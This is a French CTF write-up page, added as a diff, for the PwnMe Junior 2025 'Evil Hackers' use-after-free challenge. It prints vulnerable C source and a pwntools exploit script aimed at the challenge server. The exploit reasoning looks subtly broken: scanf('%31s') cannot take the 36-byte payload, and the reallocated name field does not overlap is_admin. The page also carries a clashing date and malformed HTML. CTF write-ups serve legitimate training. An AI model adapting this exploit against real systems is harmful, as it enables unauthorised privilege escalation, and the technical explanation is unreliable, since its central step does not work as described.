@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="fr-fr">
+<head><script src="/cybersecurity-notes/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=cybersecurity-notes/livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PwnMe Junior 2025 - Evil Hackers | WriteUps &amp; Recherches Cybersécurité</title>
+    <meta name="description" content="Write-up: Evil Hackers - PwnMe Junior 2025 Description Evil Hackers est un challenge de type &ldquo;use-after-free&rdquo; (UAF) qui simule un système de gestion d&rsquo;utilisateurs vulnérable.
+Analyse du binaire Le programme est un binaire ELF 64 bits qui offre une interface pour gérer des utilisateurs, avec plusieurs options :
+Ajouter un utilisateur Supprimer un utilisateur Afficher les informations d&rsquo;un utilisateur Modifier le nom d&rsquo;un utilisateur Quitter Voici un extrait du code source :">
+    
+    
+    <meta property="og:title" content="PwnMe Junior 2025 - Evil Hackers">
+    <meta property="og:description" content="Write-up: Evil Hackers - PwnMe Junior 2025 Description Evil Hackers est un challenge de type &ldquo;use-after-free&rdquo; (UAF) qui simule un système de gestion d&rsquo;utilisateurs vulnérable.
+Analyse du binaire Le programme est un binaire ELF 64 bits qui offre une interface pour gérer des utilisateurs, avec plusieurs options :
+Ajouter un utilisateur Supprimer un utilisateur Afficher les informations d&rsquo;un utilisateur Modifier le nom d&rsquo;un utilisateur Quitter Voici un extrait du code source :">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="http://localhost:1313/cybersecurity-notes/writeups/pwnme-junior/2024-04-14-pwnme-evilhackers/">
+    
+    
+    <link rel="icon" type="image/svg+xml" href="/cybersecurity-notes/images/favicon.svg">
+    <link rel="icon" type="image/png" href="/cybersecurity-notes/images/favicon.png">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-dark.min.css">
+    
+    
+    <link rel="stylesheet" href="/cybersecurity-notes/css/main.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/custom.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/dropdown.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/enhanced.css">
+    
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/lib/highlight.min.js"></script>
+    
+    
+    <script src="/cybersecurity-notes/js/copy-code.js" defer></script>
+    <script src="/cybersecurity-notes/js/enhanced.js" defer></script>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-content">
+            <a href="http://localhost:1313/cybersecurity-notes/" class="nav-brand">
+                <i class="fas fa-shield-alt"></i> WriteUps &amp; Recherches Cybersécurité
+            </a>
+            <div class="nav-links">
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/writeups/" class="nav-link">
+                    
+                        <i class="fas fa-flag"></i>
+                    
+                    WriteUps
+                </a>
+                
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/veille/" class="nav-link">
+                    
+                        <i class="fas fa-rss"></i>
+                    
+                    Veille
+                </a>
+                
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/outils/" class="nav-link">
+                    
+                        <i class="fas fa-tools"></i>
+                    
+                    Outils
+                </a>
+                
+                
+            </div>
+        </div>
+    </nav>
+</body>
+</html> 
+<main class="content">
+    
+<article class="single-page">
+    <header class="page-header">
+        <div class="breadcrumbs">
+            <a href="http://localhost:1313/cybersecurity-notes/">Accueil</a> &gt;
+            
+            
+            <a href="/categories/pwn">pwn</a> &gt;
+            
+            
+            <span>PwnMe Junior 2025 - Evil Hackers</span>
+        </div>
+        
+        <h1>PwnMe Junior 2025 - Evil Hackers</h1>
+        
+        <div class="meta">
+            <div class="meta-item">
+                <i class="far fa-calendar-alt"></i>
+                <span>14/04/2024</span>
+            </div>
+            
+            
+            <div class="meta-item">
+                <i class="fas fa-tags"></i>
+                <div class="tags">
+                    
+                    <a href="/tags/use-after-free" class="tag">use-after-free</a>
+                    
+                    <a href="/tags/exploitation" class="tag">exploitation</a>
+                    
+                </div>
+            </div>
+            
+            
+            
+            <div class="meta-item">
+                <i class="fas fa-flag"></i>
+                <div class="tags">
+                    
+                    <a href="/ctfs/pwnme-junior" class="tag">pwnme-junior</a>
+                    
+                </div>
+            </div>
+            
+            
+            <div class="meta-item reading-time">
+                <i class="far fa-clock"></i>
+                <span>3 min</span>
+            </div>
+        </div>
+    </header>
+    
+    
+    <div class="toc-container">
+        <div class="toc-header">
+            <i class="fas fa-list"></i> Table des matières
+        </div>
+        <div class="toc-content">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#analyse-du-binaire">Analyse du binaire</a></li>
+    <li><a href="#vulnérabilité">Vulnérabilité</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#flag">Flag</a></li>
+  </ul>
+</nav>
+        </div>
+    </div>
+    
+    
+    <div class="content">
+        <h1 id="write-up-evil-hackers---pwnme-junior-2025">Write-up: Evil Hackers - PwnMe Junior 2025</h1>
+<h2 id="description">Description</h2>
+<p>Evil Hackers est un challenge de type &ldquo;use-after-free&rdquo; (UAF) qui simule un système de gestion d&rsquo;utilisateurs vulnérable.</p>
+<h2 id="analyse-du-binaire">Analyse du binaire</h2>
+<p>Le programme est un binaire ELF 64 bits qui offre une interface pour gérer des utilisateurs, avec plusieurs options :</p>
+<ol>
+<li>Ajouter un utilisateur</li>
+<li>Supprimer un utilisateur</li>
+<li>Afficher les informations d&rsquo;un utilisateur</li>
+<li>Modifier le nom d&rsquo;un utilisateur</li>
+<li>Quitter</li>
+</ol>
+<p>Voici un extrait du code source :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> is_admin;
+</span></span><span style="display:flex;"><span>} User;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User<span style="color:#f92672">*</span> users[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> {NULL};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_user</span>(<span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index invalide</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (users[idx] <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;L&#39;emplacement est déjà occupé</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    users[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(User));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (users[idx] <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Erreur d&#39;allocation mémoire</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nom de l&#39;utilisateur: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, users[idx]<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>    users[idx]<span style="color:#f92672">-&gt;</span>is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;  <span style="color:#75715e">// Les nouveaux utilisateurs ne sont pas admin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Utilisateur ajouté avec succès</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">delete_user</span>(<span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">||</span> users[idx] <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Utilisateur invalide</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(users[idx]);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Vulnérabilité: pointeur non réinitialisé après free
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Utilisateur supprimé avec succès</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">show_user</span>(<span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">||</span> users[idx] <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Utilisateur invalide</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nom: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, users[idx]<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Admin: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, users[idx]<span style="color:#f92672">-&gt;</span>is_admin <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;Oui&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Non&#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (users[idx]<span style="color:#f92672">-&gt;</span>is_admin) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Flag: PwnMe{us3_4ft3r_fr33_1s_d4ng3r0us}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit_user</span>(<span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">||</span> users[idx] <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Utilisateur invalide</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nouveau nom: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, users[idx]<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nom modifié avec succès</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> choice, idx;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">===== Système de gestion des utilisateurs =====</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;1. Ajouter un utilisateur</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;2. Supprimer un utilisateur</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;3. Afficher un utilisateur</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;4. Modifier un utilisateur</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;5. Quitter</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Choix: &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index (0-9): &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span>(choice) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">add_user</span>(idx); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">delete_user</span>(idx); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">show_user</span>(idx); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">edit_user</span>(idx); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Option invalide</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="vulnérabilité">Vulnérabilité</h2>
+<p>La vulnérabilité principale est un Use-After-Free (UAF) : après la libération d&rsquo;un utilisateur avec <code>delete_user()</code>, le pointeur <code>users[idx]</code> n&rsquo;est pas mis à NULL. Cela signifie qu&rsquo;il est possible d&rsquo;accéder et de modifier cette zone mémoire après qu&rsquo;elle ait été libérée.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>L&rsquo;exploitation se fait en plusieurs étapes :</p>
+<ol>
+<li>Créer un utilisateur à l&rsquo;index 0</li>
+<li>Supprimer cet utilisateur (libération de la mémoire)</li>
+<li>Créer un nouvel utilisateur à l&rsquo;index 1, qui réutilisera probablement la même zone mémoire</li>
+<li>Modifier le nom de l&rsquo;utilisateur à l&rsquo;index 1 pour écraser la valeur <code>is_admin</code> de la structure</li>
+<li>Afficher l&rsquo;utilisateur à l&rsquo;index 0 pour obtenir le flag</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connexion au serveur</span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;challenge.pwnme.fr&#39;</span>, <span style="color:#ae81ff">1338</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fonction pour naviguer dans le menu</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(choice, idx):
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Choix: &#34;</span>, str(choice)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> choice <span style="color:#f92672">!=</span> <span style="color:#ae81ff">5</span>:  <span style="color:#75715e"># L&#39;option 5 ne demande pas d&#39;index</span>
+</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index (0-9): &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. Ajouter un utilisateur à l&#39;index 0</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Nom de l&#39;utilisateur: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;user1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Supprimer cet utilisateur (libération de la mémoire)</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Créer un nouvel utilisateur à l&#39;index 1</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Nom de l&#39;utilisateur: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;user2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. Modifier l&#39;utilisateur à l&#39;index 1 pour écraser la valeur is_admin</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Créer un payload qui remplit le name (32 octets) et écrit 1 dans is_admin</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># 32 &#39;A&#39; + valeur 1 pour is_admin</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Nouveau nom: &#34;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 5. Afficher l&#39;utilisateur à l&#39;index 0 pour obtenir le flag</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Récupérer et afficher le flag</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Flag: &#34;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Flag: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Quitter proprement</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><h2 id="flag">Flag</h2>
+<p>En exécutant l&rsquo;exploit, nous obtenons le flag : <code>PwnMe{us3_4ft3r_fr33_1s_d4ng3r0us}</code></p>
+
+    </div>
+    
+    <div class="page-footer">
+        
+        
+        <div class="related-posts">
+            <h3><i class="fas fa-link"></i> Articles connexes</h3>
+            <div class="related-grid">
+                
+                <a href="/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-jackpwn/" class="related-item">
+                    <h4>Breizh CTF 2025 - JackPwn</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">buffer-overflow</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+                <a href="/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-metamorph/" class="related-item">
+                    <h4>Breizh CTF 2025 - Metamorph</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">shellcode</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+                <a href="/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-otis/" class="related-item">
+                    <h4>Breizh CTF 2025 - Otis</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">use-after-free</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+            </div>
+        </div>
+        
+        
+        <div class="share">
+            <span>Partager :</span>
+            <a href="https://twitter.com/intent/tweet?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fpwnme-junior%2f2024-04-14-pwnme-evilhackers%2f&text=PwnMe%20Junior%202025%20-%20Evil%20Hackers" target="_blank" aria-label="Twitter">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fpwnme-junior%2f2024-04-14-pwnme-evilhackers%2f" target="_blank" aria-label="LinkedIn">
+                <i class="fab fa-linkedin"></i>
+            </a>
+            <a href="mailto:?subject=PwnMe%20Junior%202025%20-%20Evil%20Hackers&body=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fpwnme-junior%2f2024-04-14-pwnme-evilhackers%2f" aria-label="Email">
+                <i class="fas fa-envelope"></i>
+            </a>
+        </div>
+    </div>
+</article>
+
+</main>
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <p>&copy; 2025 WriteUps &amp; Recherches Cybersécurité</p>
+            </div>
+            <div class="footer-right">
+                <div class="social-links">
+                    <a href="https://github.com/Istaarkk" target="_blank" aria-label="GitHub">
+                        <i class="fab fa-github"></i>
+                    </a>
+                    <a href="#" target="_blank" aria-label="Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="#" target="_blank" aria-label="LinkedIn">
+                        <i class="fab fa-linkedin"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>Site propulsé par <a href="https://gohugo.io/" target="_blank">Hugo</a> | Thème <span class="theme-name">CyberNotes</span></p>
+        </div>
+    </footer>
+
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        hljs.highlightAll();
+        
+        
+        document.querySelectorAll('pre code').forEach((block) => {
+            const button = document.createElement('button');
+            button.className = 'copy-button';
+            button.textContent = 'Copier';
+            
+            const pre = block.parentNode;
+            pre.style.position = 'relative';
+            pre.insertBefore(button, pre.firstChild);
+            
+            button.addEventListener('click', () => {
+                navigator.clipboard.writeText(block.textContent);
+                button.textContent = 'Copié !';
+                setTimeout(() => {
+                    button.textContent = 'Copier';
+                }, 2000);
+            });
+        });
+        
+        
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    });
+    </script>
+    
+    
+</body>
+</html>  
